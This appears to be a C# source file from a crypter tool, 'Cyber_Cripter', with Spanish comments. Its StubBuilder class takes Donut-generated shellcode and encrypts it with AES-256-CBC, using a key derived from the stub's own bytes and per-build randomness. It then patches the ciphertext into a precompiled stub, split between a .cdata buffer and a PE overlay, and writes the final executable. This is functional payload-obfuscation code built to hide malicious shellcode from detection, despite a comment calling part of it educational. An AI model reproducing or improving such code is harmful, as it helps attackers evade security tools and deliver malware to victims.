using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace Cyber_Cripter
{
    // Parchea el stub template pre-compilado con el shellcode cifrado para generar el ejecutable final.
    // El proceso es:
    //   1. Localizar los dos slots de parcheo en el binario mediante sus magic bytes de 16 bytes.
    //   2. Generar aleatoriedad por build (heap_marker e IV).
    //   3. Derivar la clave con SHA256: SHA256(heap_marker | template[0..STABLE_REGION] | timestamp).
    //   4. Cifrar el shellcode con AES-256-CBC.
    //   5. Dividir el shellcode cifrado en half1 (embebido en .cdata) y half2 (overlay PE al final del fichero).
    //   6. Escribir los metadatos y el shellcode cifrado en el binario y guardarlo en disco como ejecutable "_crypted.exe".

    internal static class StubBuilder
    {
        // Primeros 4096 bytes del fichero que entran en el hash de la clave.
        // El builder los lee del template; el stub los lee de sí mismo en disco.
        // Ambos magic markers deben estar en offsets >= STABLE_REGION para que el parcheo
        // no altere la región hasheada e invalide la clave.
        public const int STABLE_REGION = 4096;

        // Capacidad máxima del buffer embebido en .cdata para half1. Debe coincidir con
        // HALF1_MAX en stub/stub.c (500KiB = 0x7D000).
        public const int HALF1_MAX = 0x7D000;

        // Secuencia de 16 bytes que identifica el inicio de la estructura StubMetadata en .cdata.
        // El stub también la usa para localizar sus propios metadatos en disco.
        private static readonly byte[] METADATA_MAGIC = new byte[] {
            0x4D, 0x45, 0x54, 0x41, 0x21, 0x43, 0x52, 0x59,
            0x70, 0x54, 0x65, 0x52, 0x21, 0xAA, 0xBB, 0xCC
        };

        // Secuencia de 16 bytes que identifica el inicio del buffer half1 en .cdata.
        private static readonly byte[] HALF1_MAGIC = new byte[] {
            0x48, 0x41, 0x4C, 0x46, 0x21, 0x4F, 0x4E, 0x45,
            0x21, 0x44, 0x41, 0x54, 0x41, 0xDD, 0xEE, 0xFF
        };

        // Offsets de cada campo dentro de StubMetadata (#pragma pack(1)), contados desde
        // el inicio del magic (16 bytes) hasta el campo correspondiente.
        private const int OFF_HEAP_MARKER = 16;                     // 8 bytes de aleatoriedad por build
        private const int OFF_TIMESTAMP   = 16 + 8;                 // Unix timestamp en LE (u64)
        private const int OFF_IV          = 16 + 8 + 8;             // IV de AES, 16 bytes aleatorios
        private const int OFF_HALF1_SIZE  = 16 + 8 + 8 + 16;        // tamaño de half1 (u32 LE)
        private const int OFF_HALF2_SIZE  = 16 + 8 + 8 + 16 + 4;    // tamaño de half2 (u32 LE)
        private const int OFF_HASH_REGION_SIZE = 16 + 8 + 8 + 16 + 4 + 4; // bytes hasheados (u32 LE)

        // Información del build que se muestra en el panel de estado de la UI
        public sealed class BuildReport
        {
            public string OutputPath;       // ruta del fichero generado
            public int    ShellcodeBytes;   // tamaño del shellcode antes de cifrar
            public int    CiphertextBytes;  // tamaño del ciphertext tras AES
            public int    Half1Bytes;       // bytes embebidos en .cdata
            public int    Half2Bytes;       // bytes en el overlay PE
            
            public string HeapMarkerHex;    // (input1 de la Key)
            public int    StableRegion;     // (input2 de la key)
            public ulong  Timestamp;        // Unix timestamp del build (input3 de la key)
            public string KeyHex;           // clave AES derivada en hex (solo educativo)
            public string HashStableRegion;
        }

        // Función que convierte un hexadecimal a String en el mismo formato que el stub en C.
        // -- Utilizada para DEBUGGAR valores
        private static string ToHex(byte[] data)
        {
            StringBuilder sb = new StringBuilder(data.Length * 2);

            foreach (byte b in data)
                sb.AppendFormat("{0:X2}", b);

            return sb.ToString();
        }

        // Función que obtiene un string en formato matriz hexadecimal, de un byte[]
        // -- Utilizada para DEBUGGAR
        private static string getHexStringMatrix(byte[] data)
        {
            StringBuilder sb = new StringBuilder(data.Length * 3);

            for (int i = 0; i < data.Length; i++)
            {
                sb.AppendFormat("{0:X2}", data[i]);

                if ((i + 1) % 16 == 0)
                    sb.AppendLine();
                else
                    sb.Append(' ');
            }

            if (STABLE_REGION % 16 != 0)
                sb.AppendLine();

            return sb.ToString();
        }

        // Busca el magic marker en el array de bytes y devuelve su offset.
        // Lanza excepción si no se encuentra o si aparece más de una vez (ambigüedad).
        private static int FindUnique(byte[] templateBytes, byte[] magic, string label)
        {
            int found = -1;
            int last = templateBytes.Length - magic.Length;
            for (int i = 0; i <= last; i++)
            {
                bool match = true;
                for (int j = 0; j < magic.Length; j++)
                    if (templateBytes[i + j] != magic[j]) { match = false; break; }
                if (!match) continue;
                if (found != -1)
                    throw new InvalidOperationException(label + " appears more than once in the stub template.");
                found = i;
            }
            if (found == -1)
                throw new InvalidOperationException(label + " not found in the stub template.");
            return found;
        }

        /// <summary>
        /// Construye el ejecutable final del crypter a partir de la plantilla del stub y del shellcode generado por Donut. Durante el proceso localiza las regiones de
        /// parcheo del stub, genera los metadatos del build, deriva la clave AES, cifra el shellcode, divide el texto cifrado entre la sección embebida en .cdata y el 
        /// overlay PE, parchea la plantilla con la información necesaria para su reconstrucción en tiempo de ejecución y escribe el binario resultante en disco.
        /// </summary>
        /// <param name="templateBytes">Plantilla binaria del stub que será parcheada.</param>
        /// <param name="shellcode">Shellcode generado por Donut que se desea utilizar.</param>
        /// <param name="outputPath">Ruta en disco donde se escribirá el ejecutable final.</param>
        /// <returns>
        public static BuildReport Build(byte[] templateBytes, byte[] shellcode, string outputPath)
        {
            // Localizar los dos magic markers en el binario para saber dónde parchear
            int metaOff  = FindUnique(templateBytes, METADATA_MAGIC, "METADATA_MAGIC");
            int half1Off = FindUnique(templateBytes, HALF1_MAGIC,    "HALF1_MAGIC");

            // Verificar que los slots de parcheo no caen dentro de la región hasheada (primeros 4 KiB).
            // Si lo hicieran, el hash que calcula el stub en runtime no coincidiría con el del builder.
            if (metaOff < STABLE_REGION || half1Off < STABLE_REGION)
                throw new InvalidOperationException(
                    "Stub template's patch slots overlap the hash region (offsets " +
                    metaOff + " and " + half1Off + " vs STABLE_REGION " + STABLE_REGION +
                    "). Rebuild the stub so .cdata starts later.");

            // Verificar que el buffer embebido para half1 cabe entero en el template.
            // Si .cdata fue truncada por la optimización BSS de MSVC, el template será demasiado pequeño.
            int half1DataOff = half1Off + 16; // los datos empiezan justo después del magic de 16 bytes
            if (half1DataOff + HALF1_MAX > templateBytes.Length)
                throw new InvalidOperationException(
                    "Stub template too small to contain " + HALF1_MAX +
                    " bytes after HALF1_MAGIC. .cdata was probably truncated by " +
                    "MSVC's BSS optimization — see stub/README.md.");

            // Generar aleatoriedad única por build: heap_marker (8 bytes) e IV (16 bytes)
            byte[] heapMarker = new byte[8];
            byte[] iv         = new byte[16];
            using (var rng = new RNGCryptoServiceProvider())
            {
                rng.GetBytes(heapMarker);
                rng.GetBytes(iv);
            }
            ulong timestamp = (ulong)DateTimeOffset.UtcNow.ToUnixTimeSeconds();
            byte[] hashStableRegion = Encryption.Sha256(templateBytes.Take(STABLE_REGION).ToArray());
            

            // Derivar la clave AES-256 del mismo modo que lo hará el stub en runtime:
            // SHA256(heap_marker || templateBytes[0..STABLE_REGION] || timestamp)
            byte[] key = Encryption.DeriveKey(heapMarker, templateBytes, STABLE_REGION, timestamp);

            // Cifrar el shellcode con AES-256-CBC usando la clave derivada y el IV aleatorio
            byte[] ciphertext = Encryption.EncryptAes256Cbc(shellcode, key, iv);

            // Dividir el ciphertext en dos mitades:
            // - half1: primera mitad, embebida en el buffer .cdata del stub (máx. 1 MiB)
            // - half2: resto, appendeada como overlay PE al final del fichero
            int half1Size = Math.Min(ciphertext.Length / 2, HALF1_MAX);
            int half2Size = ciphertext.Length - half1Size;

            // Parchear la estructura StubMetadata con todos los valores del build
            Buffer.BlockCopy(heapMarker,                                0, templateBytes, metaOff + OFF_HEAP_MARKER, 8);
            Buffer.BlockCopy(BitConverter.GetBytes(timestamp),          0, templateBytes, metaOff + OFF_TIMESTAMP,   8);
            Buffer.BlockCopy(iv,                                        0, templateBytes, metaOff + OFF_IV,          16);
            Buffer.BlockCopy(BitConverter.GetBytes((uint)half1Size),    0, templateBytes, metaOff + OFF_HALF1_SIZE,  4);
            Buffer.BlockCopy(BitConverter.GetBytes((uint)half2Size),    0, templateBytes, metaOff + OFF_HALF2_SIZE,  4);
            Buffer.BlockCopy(BitConverter.GetBytes((uint)STABLE_REGION),0, templateBytes, metaOff + OFF_HASH_REGION_SIZE, 4);

            // Escribir half1 en el buffer embebido de .cdata, justo después del magic
            Buffer.BlockCopy(ciphertext, 0, templateBytes, half1DataOff, half1Size);
            // Limpiar el resto del buffer para no dejar bytes basura del template original
            for (int i = half1Size; i < HALF1_MAX; i++)
                templateBytes[half1DataOff + i] = 0;

            // Escribir el fichero final: stub parcheado + half2 como overlay PE
            // El PE loader ignora los bytes tras la última sección, por eso el overlay es transparente
            Directory.CreateDirectory(Path.GetDirectoryName(outputPath));
            using (var fs = new FileStream(outputPath, FileMode.Create, FileAccess.Write))
            {
                fs.Write(templateBytes, 0, templateBytes.Length);
                if (half2Size > 0)
                    fs.Write(ciphertext, half1Size, half2Size);
            }

            return new BuildReport {
                OutputPath      = outputPath,
                ShellcodeBytes  = shellcode.Length,
                CiphertextBytes = ciphertext.Length,
                Half1Bytes      = half1Size,
                Half2Bytes      = half2Size,
                HeapMarkerHex   = ToHex(heapMarker),
                StableRegion    = STABLE_REGION,
                Timestamp       = timestamp,
                KeyHex          = ToHex(key),
                HashStableRegion = getHexStringMatrix(hashStableRegion)
            };
        }

    }
}
